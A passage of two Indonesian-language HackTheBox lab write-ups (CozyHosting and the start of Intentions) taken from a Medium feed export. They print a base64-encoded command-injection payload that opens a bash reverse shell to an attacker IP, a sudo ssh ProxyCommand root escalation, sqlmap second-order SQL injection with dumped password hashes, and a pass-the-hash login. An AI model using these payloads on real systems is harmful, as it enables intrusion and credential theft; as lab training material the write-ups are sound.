    "content": "\n<h3>HackTheBox — CozyHosting</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/300/1*kk9ZKoFrouzJcSN65vx-XA.png\"></figure><h3>ENUMERATION</h3>\n<p>Langkah pertama melakukan Information Gathering dengan menggunakan tools <strong>Nmap</strong> :</p>\n<pre>sudo nmap -sC -sV --script vuln -oA nmap 10.10.11.230</pre>\n<p>Hasil dari <strong>Nmap</strong> :</p>\n<pre>Nmap scan report for 10.10.11.230<br>Host is up (0.039s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT     STATE SERVICE  VERSION<br>22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| vulners: <br>|   cpe:/a:openbsd:openssh:8.9p1: <br>|       PRION:CVE-2023-28531    7.5     https://vulners.com/prion/PRION:CVE-2023-28531<br>|_      PRION:CVE-2021-28041    4.6     https://vulners.com/prion/PRION:CVE-2021-28041<br>80/tcp   open  http     nginx 1.18.0 (Ubuntu)<br>|_http-passwd: ERROR: Script execution failed (use -d to debug)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn't find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn't find any DOM based XSS.<br>1234/tcp open  hotline?<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>BService detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 245.34 seconds</pre>\n<h3>WEB ENUMERATION</h3>\n<p>Dari informasi diatas, pertama-tama kita coba meng-akses port 80 dan melakukan <em>directory scanning</em> dengan menggunakan <strong>dirsearch</strong> :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*WtmSuvpVSqJx0FK_JeBQhw.png\"></figure><pre>dirsearch -u &lt;url&gt;</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*rrQriF2r8ANzkmzA4r2H1g.png\"></figure><p>Terlihat beberapa path yang menarik , sekarang kita coba untuk menganalisa path /actuator/sessions. Dan terlihat hasil berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*eksSO2vPh2Joi4C0ulknVQ.png\"></figure><p>Response :</p>\n<pre>HTTP/1.1 200 <br>Server: nginx/1.18.0 (Ubuntu)<br>Date: Tue, 12 Sep 2023 12:49:46 GMT<br>Content-Type: application/vnd.spring-boot.actuator.v3+json<br>Connection: close<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 0<br>Cache-Control: no-cache, no-store, max-age=0, must-revalidate<br>Pragma: no-cache<br>Expires: 0<br>X-Frame-Options: DENY<br>Content-Length: 148<br><br>{<br>\"0C03A850ED2166893C44DE15E445F006\":\"UNAUTHORIZED\",<br>\"62B7CA7EE980EE7E0C6097F0019C697D\":\"kanderson\",<br>\"9DF2A368090B8669564428246553919E\":\"UNAUTHORIZED\"<br>}</pre>\n<p>Terlihat beberapa session cookie, sekarang kita coba melakukan manipulasi session dengan menggunakan cookie Kanderson, dan terlihat kita berhasil masuk ke dalam Dashboard Admin.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*kUWfDBqsaEwIHy73p_204Q.png\"></figure><p>Pada burp, terlihat pesan error meng-indikasikan adanya celah <strong><em>Command Injection</em></strong> pada aplikasi ini.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*N7DkBJYMHxZLuBKLXArfzg.png\"></figure><p>Sekarang kita coba untuk memasukkan payload berikut untuk mendapatkan RCE :</p>\n<pre>/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.68/9991 0&gt;&amp;1 -&gt; encode Base64<br><br>;echo${IFS}\"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQ3LzQ0NDQgMD4mMQ==\"|base64${IFS}-d|bash;</pre>\n<p>Selanjutnya gunakan listener dari <strong>netcat</strong> untuk mendapatkan reverse shell.</p>\n<pre>nc -lvnp &lt;port&gt;</pre>\n<p>Pada halaman web, kita akan mendapat response 504 Gateway Time-out.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*el6UugPRTFSdHn2EkgXFYw.png\"></figure><p>Dan pada terminal, terlihat kita berhasil mendapatkan Reverse Shell.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/787/1*fy4IaBu6H1yVdXRk-g7qjg.png\"></figure><p>Pada tahap ini, terdapat file .jar pada path /app, selanjutnya download file .jar tersebut dengan menggunakan python http server :</p>\n<pre>python -m http.server 1334</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*awZ7B0yAWb2_GDBcXKiq7Q.png\"></figure><p>Lakukan decompile pada file .jar tersebut dengan menggunakan Online Decompiling Tools, dan setelah dilakukan decompile terlihat hasil berikut pada Application Properties :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/755/1*yaRY-Fs_EG_IxyZx1-dGww.png\"></figure><p>Terlihat beberapa informasi sensitif berupa Database yang menggunakan PostgreSQL dan disini saya mencoba untuk melakukan koneksi ke database tersebut dengan command berikut :</p>\n<pre>psql -U postgres -W -h localhost -d cozyhosting</pre>\n<blockquote>psql: manages and interacts with PostgreSQL databases.</blockquote>\n<blockquote>-U: specifies the db username to connect to the database</blockquote>\n<blockquote>-W: prompts the user for the password before connecting to db</blockquote>\n<blockquote>-h: specifies the hostname of the PostgreSQL server. In this case, it's connecting to the local machine (localhost).</blockquote>\n<blockquote>-d cozyhosting: name of the database (-d) to connect to, which in this case is \"cozyhosting.\"</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*2aHNV2dgAo7Yx_7QhCCkaw.png\"></figure><p>Saat berhasil meng-akses database cozyhosting, buka table users dengan perintah :</p>\n<pre>SELECT * FROM users;</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*8lLzOR7544vl8wOolF3AAg.png\"></figure><p>Pada table tersebut terdapat 2 kredensial. selanjutnya saya melakukan crack pada password dengan menggunakan tools <strong>Johntheripper :</strong></p>\n<pre>john -w /usr/share/wordlists/rockyou.txt hash.txt</pre>\n<p>Kemudian setelah berhasil mendapatkan password, saya melakukan Koneksi SSH menggunakan username josh dengan command :</p>\n<pre>ssh josh@10.10.11.230</pre>\n<p>Saat berhasil masuk akan terlihat file flag user.txt</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*eVLgeejDfVxeoTUNA3nsEw.png\"></figure><p>Langkah selanjutnya adalah mencari flag root pada machine ini dengan metode Privilage Escalation.</p>\n<h3>PRIVILAGE ESCALATION</h3>\n<p>Pertama mari kita cek privilage terlebih dahulu dengan command :</p>\n<pre>sudo -l</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bs2bSQ5s2Qgw8pVj58NI8g.png\"></figure><p>Di dalam skenario ini, user Josh memiliki akses untuk eksekusi privilage dengan perintah berikut :</p>\n<pre>sudo /usr/bin/ssh *</pre>\n<p>Tujuan selanjutnya adalah mengidentifikasi teknik injection perintah SSH yang sesuai. Untungnya, saya menemukan artikel yang berguna di gotFobins, sumber untuk menemukan teknik Binary Exploitation.</p>\n<p>Perintah yang saya gunakan memungkinkan untuk mendapat shell interaktif melalui opsi ProxyCommand, dan itulah yang saya butuhkan:</p>\n<pre>ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x<br>- `-o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2'`: specifies a custom ProxyCommand configuration using the `-o` option. ProxyCommand is used to specify a command that should be executed to establish the SSH connection through a proxy or intermediate server.<br>- `sh`: This is the shell (usually `/bin/sh` or `/bin/bash`) being invoked as a command.<br>- `0&lt;&amp;2`: redirects file descriptor 0 (stdin) to file descriptor 2 (stderr).<br>- `1&gt;&amp;2`: redirects file descriptor 1 (stdout) to file descriptor 2 (stderr).<br>- When combined, `sh 0&lt;&amp;2 1&gt;&amp;2` essentially redirects both standard input and standard output to standard error. This redirection is a common technique used in reverse shell payloads.<br>- `x`: This is the target hostname or IP address to which the SSH connection is being established.</pre>\n<p>setelah berhasil eksekusi perintah diatas maka akan mendapatkan hasil seperti berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/617/1*wIKEC42g3XWBjc_SaKAlIQ.png\"></figure><p>Selanjutnya adalah membuka file root.txt dengan perintah :</p>\n<pre>cat root.txt</pre>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=41b061e89a96\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "hackthebox",
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-cozyhosting-41b061e89a96?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/a91356086d2c",
    "slug": "https://medium.com/p/a91356086d2c",
    "title": "HackTheBox— Intentions",
    "content": "\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/926/1*K3HdYPuVVl1W4X7nCuFr4g.png\"></figure><h3>Enumeration</h3>\n<p><strong>Nmap Result :</strong></p>\n<pre># Nmap 7.94 scan initiated Mon Oct  9 02:40:30 2023 as: nmap -sCV -p- -oA nmap 10.10.11.220<br>Nmap scan report for 10.10.11.220 (10.10.11.220)<br>Host is up (0.045s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)<br>|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Intentions<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>Service detection performed. Please report any incorrect results at<a href=\"https://nmap.org/submit/\"> https://nmap.org/submit</a>/ .<br># Nmap done at Mon Oct  9 02:40:59 2023 -- 1 IP address (1 host up) scanned in 29.29 seconds</pre>\n<p>Dari hasil nmap diatas, terdapat informasi 2 port terbuka. pada port 22 terdapat SSH Server yang berjalan dan pada port 80 terdapat nginx web server. Akan tetapi saya belum memiliki kredensial SSH yang valid, maka kita akan memulai dengan menganalisa entry point exploit pada port 80.</p>\n<h3>Nginx — Port 80</h3>\n<p>Sebelum mulai, tambahkan IP Host ke dalam host file dengan menggunakan command berikut :</p>\n<pre>echo \"10.129.83.115 intentions.htb\" | sudo tee -a /etc/hosts</pre>\n<p>Pada saat membuka [<a href=\"http://intentions.htb/\">http://intentions.htb</a>] makan akan muncul tampilan seperti berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/684/1*_AneKn2W18DhlZ24YDfGlg.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/745/1*kehqvRhr3RGvTvvesAoeGg.png\"></figure><p>Terdapat halaman Login dan Registrasi.</p>\n<p>Sebelum saya melakukan registrasi, saya akan mencoba untuk Fuzzing direktori dengan menggunakan tools <strong>gobuster</strong> :</p>\n<pre>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/ -b 403,404 -o gobuster</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/980/1*LuASiDzbQt3Ki1xCCkKh6A.png\"></figure><p>Terdapat 3 path yang menarik yaitu /admin, /gallery dan /storage.</p>\n<h3>Apps Enumeration</h3>\n<p>Pada tahap ini saya mencoba untuk melakukan Bypass login namun gagal, maka saya memutuskan untuk registrasi normal user untuk masuk kedalam aplikasi.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/735/1*UvkGlNVoU08RmGFvmwdYcA.png\"></figure><p>Pada halaman <em>homepage</em> aplikasi akan muncul tampilan seperti berikut.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Q-hlp6nRQ3eLEwk3AYgI-g.png\"></figure><p>Menu <em>Gallery</em> dan <em>Feed</em> berfungsi untuk menampilkan gambar berdasarkan filter <em>genres</em>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*-YoKXD5DR7LYjBPVjQucPA.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*ibUrDMN159kWE0_78oX1iQ.png\"></figure><p>Dan pada menu <em>Profile</em> kita bisa lihat bahwa ada form “Favourite Genre” yang secara default memiliki value “food,travel,nature” .</p>\n<p>Dari konteks diatas, Kita dapat menyimpulkan bahwa API yang mendukung halaman feed memanfaatkan pengaturan profil ini untuk menampilkan konten yang relevan.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*IklKYg-G3duqlOf2ODrpSg.png\"></figure><p>Mengingat pada fitur ini adalah salah satu dari sedikit tempat/entry point pada aplikasi web untuk diproses oleh backend atau API, saya akan melanjutkan enumerasi di fitur ini dan mencari kemungkinan entry point Injection serta melihat response dan perilaku mencurigakan lainnya.</p>\n<p>Pada tahap ini saya menggunakan <strong>Burpsuite</strong> untuk meng-intercept Request dan melakukan analisa pada response yang diterima.</p>\n<ul>\n<li>Permintaan POST ke <a href=\"http://intentions.htb/api/v1/gallery/user/genres\">http://intentions.htb/api/v1/gallery/user/genres</a> untuk memperbarui genre favorit</li>\n<li>Permintaan GET ke <a href=\"http://intentions.htb/api/v1/gallery/user/feed\">http://intentions.htb/api/v1/gallery/user/feed</a> untuk mengambil feed.</li>\n</ul>\n<p>Tujuan selanjutnya adalah untuk meneruskan request ini ke <strong>sqlmap</strong>, jadi saya harus menyimpan konten dari setiap request ini ke dalam sebuah file. saua akan menyimpan permintaan POST ke /user/genres sebagai updateGenresRequest dan akan terlihat seperti berikut :</p>\n<pre>POST /api/v1/gallery/user/genres HTTP/1.1<br>Host: 10.10.11.220<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: application/json, text/plain, */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: application/json<br>X-XSRF-TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br>Content-Length: 17<br>Origin: http://10.10.11.220<br>Connection: close<br>Referer: http://10.10.11.220/gallery<br>Cookie: XSRF-TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI-drctCniqtfbEzSV5sKw<br><br>{\"genres\":\"food\"}</pre>\n<p>Saya juga menyimpan GET Request /user/feed menjadi file fetchFeedRequest dan akan terlihat seperti berikut :</p>\n<pre>GET /api/v1/gallery/user/feed HTTP/1.1<br>Host: 10.10.11.220<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: application/json, text/plain, */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>X-XSRF-TOKEN: eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0=<br>Connection: close<br>Referer: http://10.10.11.220/gallery<br>Cookie: XSRF-TOKEN=eyJpdiI6Ikd2cWRrcjhWdElQQUhTV0tFQkRCc2c9PSIsInZhbHVlIjoiY1JLQUMwbCtPekNaUDNUV2puQk9Da2ZpK0JNSjJyb1NTZTR1bVZPODhzR29OK1hRTndJcHozQWtLNU1kUXJOL3U3SC9qVllBVHBJbzlIVlM3TGNYc1kxd0lxOVRJVUdBUXk4WDFSUi9RSzNEcVZzVGNnZHpxN0FzQjNQK0lKZEsiLCJtYWMiOiJhZTg3OTE4Y2M4NGQ0NmY2MjgxMzg2MDQzMGRjNDhjZTE2ZjA2ODk4YmJiOWI3NDdkYjZjMzdkM2Q4MjVkYzIyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkdsMXdPTkFORDdLUjJHMTVOcGM0VGc9PSIsInZhbHVlIjoiTmdwZTIvY3pESFdjbnVQZFJON2lsUnhPdXF0eG53RDFiUW5YTTRWRmFXcFNBeEdRY1dadDFKTUxBS2tSbHhjbXVDQjBxTmxsdVFGUUxaMklWSmJCZmtFUmtCd0lqdExhNUVpUGl2ZTh3UU9XUU8vVzF5MThyTnRFV0FFQWZFeVIiLCJtYWMiOiIwZjk5Yjc0YjJmOTRmYzM4MDU4YTFiNzViZWE5OTkwYzUzNTViZTUwNzY2YjI5Y2YxZWI5Mzg1NThmOThjNGQyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3NDg1NjAzLCJleHAiOjE2OTc1MDcyMDMsIm5iZiI6MTY5NzQ4NTYwMywianRpIjoiVUgyb09Oc0NWUEVCdmNuYSIsInN1YiI6IjMwIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3VU1sk2yzmM9Gch4QuUyEeI-drctCniqtfbEzSV5sKw</pre>\n<p>Pada tahap ini kita akan melakukan evaluasi request diatas apakah memungkinkan untuk dilakukan SQL Injection menggunakan <strong>Sqlmap</strong>.</p>\n<h3>Fitur “Update Genres”</h3>\n<pre>sqlmap -r updateGenresRequest --batch</pre>\n<p>Command diatas merupakan basic scan <strong>sqlmap</strong> untuk updateGenresRequest akan tetapi tidak berhasil.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*qtb-NJCxO1pBTqqb0Yokrw.png\"></figure><h3>Kombinasi Update Request dan Fetch Feed Request</h3>\n<p>Selanjutnya, kita mencoba scan kedua request menggunakan <strong>sqlmap</strong>, akan tetapi masih belum berhasil.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*1a3S68bS5JvmlNiqFUFWsA.png\"></figure><p>Akan tetapi dapat terlihat pada form “favourite genres” secara langsung terhubung dengan feed kita. Maka selanjutnya kita coba eksplorasi teknik lainnya, terlihat <strong>sqlmap</strong> menyarankan untuk menggunakan tamper script.</p>\n<pre>maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')<br>and/or switch '--random-agent'</pre>\n<p>Jika kita berinteraksi secara manual dengan endpoint terlihat pada request update genre, kita dapat mengamati bahwa request dengan <em>spasi</em> seperti ‘nature, animals, test’ akan menjadi ‘nature,animals,test’. Dan saat berikutnya kita mengunjungi halaman, menunjukkan bahwa spasi secara aktif dihapus. Disini saya langsung mencoba untuk melakukan pemeriksaan SQLi tingkat kedua dengan Tamper Script untuk mengubah spasi :</p>\n<pre>sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --dbms=MySQL --batch --tamper=space2comment --level=5</pre>\n<pre>Note: Sometimes this may only identify a time-based SQL injection, at which point we can optionally extend our check by specifying --dbms=MySQL --level=5</pre>\n<p>Finally! kita berhasil melakukan SQL Injection dengan result sebagai berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*TyhV7sz20ULkj9GYR9WPUg.png\"></figure><pre>Parameter: JSON genres ((custom) POST)<br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: {\"genres\":\"food’) AND 6484=6484 AND (‘GWSr’=’GWSr\"}<br>Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: {\"genres\":\"food’) AND (SELECT 6006 FROM (SELECT(SLEEP(5)))GiDV) AND (‘jDDu’=’jDDu\"}<br>    Type: UNION query<br>    Title: MySQL UNION query (NULL) - 5 columns<br>    Payload: {\"genres\":\"food') UNION ALL SELECT NULL,NULL,CONCAT(0x7171716271,0x4a68777a6e676465764b7a46776854567759646c4d61536a7678516b6f52476e4446676556564a57,0x717a7a7171),NULL,NULL#\"}<br>---<br>[04:11:42] [WARNING] changes made by tampering scripts are not included in shown payload content(s)<br>[04:11:42] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu<br>web application technology: Nginx 1.18.0<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br>[04:11:42] [WARNING] HTTP error codes detected during run:<br>500 (Internal Server Error) - 242 times<br>&lt;--SNIP&gt;</pre>\n<p>Setelah berhasil melakukan enumeration pada database target, selanjutnya saya akan melakukan tahap selanjutnya, yaitu melihat tables pada database tersebut dengan menggunakan — tables flag.</p>\n<pre>sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables</pre>\n<pre>Database: intentions<br>[4 tables]<br>+---------------------------------------+<br>| gallery_images                        |<br>| migrations                            |<br>| personal_access_tokens                |<br>| users                                 |<br>+---------------------------------------+</pre>\n<p>Langkah selanjutnya adalah, saya mencoba untuk dump isi data dari tabel <strong>users</strong> , menggunakan flag -T users dan — dump :</p>\n<pre>sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment -T users --dump</pre>\n<p>Maka akan menampilkan result sebagai berikut :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*VDaTNygZnCyR1PJ2vSe5Vg.png\"></figure><pre>steve@intentions.htb | steve | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa <br>greg@intentions.htb  | greg  | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m</pre>\n<p>Akhirnya, kami memiliki 2 kata sandi BCrypt kompleks yang tidak dapat diretas secara mudah. Untuk saat ini, mari kita alihkan fokus ke tempat lain terlebih dahulu.</p>\n<p>Kembali kita melakukan analisa pada proses /api/v1/* , saya ingin memeriksa apakah endpoint v2 juga tersedia.</p>\n<p>Pada proses ini kita kembali menggunakan tools <strong>gobuster :</strong></p>\n<pre>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404 -o Gobusterv2</pre>\n<pre>===============================================================<br>http://intentions.htb/api/v2/auth/login                (Status: 405) [Size: 825]<br>http://intentions.htb/api/v2/auth/logout               (Status: 405) [Size: 825]<br>http://intentions.htb/api/v2/auth/refresh              (Status: 500) [Size: 6615]<br>http://intentions.htb/api/v2/auth/register             (Status: 405) [Size: 825]<br>http://intentions.htb/api/v2/auth/user                 (Status: 302) [Size: 330] [--&gt; http://intentions.htb]<br>Progress: 20476 / 20477 (100.00%)<br>===============================================================</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/612/1*69lkezr5oXOw27U_N1UbIg.png\"></figure><p>Terlihat request mendapat response code 405, ini menandakan bahwa request tidak valid. ini bisa di verifikasi dengan mencoba secara langsung ke endpoint /v2/login menggunakan curl :</p>\n<pre>curl +XPOST http://intentions.htb/api/v2/auth/login</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1001/1*Jh7WJ07IbsoK3i863DOKog.png\"></figure><p>Sekarang kita coba bandingkan bila login menggunakan /api/v1 :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*gMOPqeIvd0L88MtyZpG32g.png\"></figure><p>Disini kita bisa melihat bahwa endpoint API original v1 menerima parameter “email” dan “password”, dan sedangkan API v2 menerima parameter “email” dan “hash”. Kita bisa simpulkan bahwa keduanya melakukan request yang sama.</p>\n<p>Pada tahap SQL Injection, kita mendapatkan 2 <em>hash password</em> dari user administrator. Jika API v2 bisa digunakan, kita bisa mencoba untuk login tanpa harus meng-crack hash password tersebut.</p>\n<p>Disini saya mencoba untuk autentikasi user administrator menggunakan hash :</p>\n<pre>curl -d 'email=steve@intentions.htb&amp;hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -XPOST http://intentions.htb/api/v2/auth/login</pre>\n<pre>{\"status\":\"success\",\"name\":\"steve\"}%</pre>\n<p>Tampaknya kita dapat melakukan otentikasi menggunakan hash melalui v2. Cara termudah untuk melanjutkan adalah dengan membuka halaman login kemudian melakukan intercept pada burpsuite dan mencoba masuk dengan email steve@intentions.htb dan kata sandi $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*BlWQA3Ph0WjU1tpCujfxFw.png\"></figure><p>Setelah berhasil masuk, saatnya mencoba untuk eksplor admin panel.</p>\n<p>Di sana kami melihat halaman berita yang memberi kami beberapa detail menarik. Terlepas dari pemberitahuan hukum, kami melihat beberapa berita tentang API v2. Kami sudah tahu tentang perubahan kata sandi/hash tetapi kami juga mendapatkan tautan referensi ke imagick, yang diduga digunakan untuk menerapkan efek pada gambar.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*JLUteDLY5iLAEsFoltowYA.png\"></figure><p>Terdapat juga halaman users yang menampilkan beberapa informasi dasar tentang users yang terdaftar. tapi tidak bisa melakukan action apapun hanya dapat melakukan <em>view</em> saja.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*l3ztXSUwtcT2rlL1k0Hnuw.png\"></figure><p>Saat menavigasi ke tab Gambar di panel admin, kita disajikan dengan daftar gambar terkini, genrenya, URL publik, dan link ke halaman Edit.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*ntwDrjfhRADPmZFH_JaJ6A.png\"></figure><p>Setiap gambar memiliki masing-masing halaman untuk edit.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*jqAvzs_jyJ__HPMsJJuQLw.png\"></figure><p>Di bagian atas halaman ini, terdapat empat tombol berbeda yang dapat kita klik untuk menerapkan beberapa efek pada gambar saat ini, dan menampilkannya di halaman. Di bawah pratinjau gambar, berbagai detail bermanfaat tentang gambar ditampilkan seperti kompresi, tinggi, lebar, ukuran, dan yang terpenting adalah jalur absolut ke file pada disk.</p>\n<p>Sebagai contoh, Gambar 4 dapat ditemukan di lokasi berikut: 